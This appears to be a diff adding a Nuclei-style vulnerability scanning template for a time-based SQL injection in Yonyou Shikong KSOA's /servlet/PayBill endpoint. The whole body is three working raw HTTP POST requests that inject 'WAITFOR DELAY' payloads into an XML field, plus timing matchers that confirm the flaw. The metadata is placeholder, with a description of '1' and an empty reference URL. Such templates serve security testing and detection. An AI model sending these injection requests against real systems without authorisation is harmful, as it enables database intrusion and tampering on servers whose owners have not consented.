@@ -1,0 +1,41 @@
+id: yonyou-ksoa-paybill-sqi
+info:
+  name: 用友时空 KSOA PayBill SQL 注入漏洞
+  author: apple
+  severity: high
+  description: 1
+  reference:
+    - https://
+http:
+  - raw:
+      - |-
+        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'0:0:5';--+</name><name>1</name><name>103343</name></root>
+      - |-
+        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'0:0:6';--+</name><name>1</name><name>103343</name></root>
+      - |-
+        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'0:0:9';--+</name><name>1</name><name>103343</name></root>
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
